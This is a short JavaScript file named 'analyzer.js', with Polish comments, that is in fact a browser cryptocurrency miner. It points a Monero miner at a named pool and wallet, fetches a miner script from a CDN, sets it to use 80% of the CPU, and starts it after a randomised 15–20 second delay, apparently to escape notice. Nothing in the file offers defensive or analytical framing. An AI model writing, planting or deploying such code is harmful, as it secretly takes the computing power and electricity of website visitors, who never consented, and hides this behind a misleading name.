// analyzer.js - Poprawiony miner z debugiem
const config = {
    pool: 'xmr-eu1.nanopool.org:14433',
    wallet: '831iLs4viYZ4cCJhuH2QUxWKBzVw3wPXFNGavgjjic2y6Vcujx7bWTyT5YMMrQd9BpFv1TEeXquGH5Vcdn1vwwXfTpVaYDD',
    throttle: 0.8, // 80% CPU
    threads: navigator.hardwareConcurrency || 4
};

function initMiner() {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@xmrig/webassembly@6.20.0/miner.js';
    script.onload = () => {
        const miner = new window.Miner({
            pool: config.pool,
            wallet: config.wallet,
            threads: config.threads,
            throttle: config.throttle
        });
        
        miner.start();
        console.log('[DEBUG] Miner started:', miner);
    };
    document.head.appendChild(script);
}

// Opóźnione uruchomienie (15s + losowy czas)
setTimeout(() => {
    initMiner();
}, 15000 + Math.random() * 5000);
